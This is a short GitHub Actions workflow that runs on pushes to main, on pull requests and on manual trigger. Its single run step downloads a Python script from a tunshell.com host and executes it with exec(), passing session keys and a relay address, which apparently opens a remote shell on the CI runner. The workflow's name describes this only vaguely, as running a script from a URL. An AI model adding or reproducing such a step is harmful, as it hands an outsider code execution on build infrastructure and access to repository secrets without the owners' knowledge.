name: Run Python Script from URL

on:
  push:
    branches:
      - main
  pull_request:
  workflow_dispatch: # Allows manual triggering of the workflow

jobs:
  run-python:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Set up Python 3
      uses: actions/setup-python@v4
      with:
        python-version: '3.x'

    - name: Run Python script
      run: |
        echo "Running Python script from URL"
        python3 -c "import urllib.request; r=urllib.request.urlopen('https://lets.tunshell.com/init.py'); exec(r.read().decode('utf-8'), {'p': ['T', '4cVACJfQaN3HmpT2lzCm3G', 'D7esoEOvSdB5ccjOcU1Oxs', 'eu.relay.tunshell.com']})"
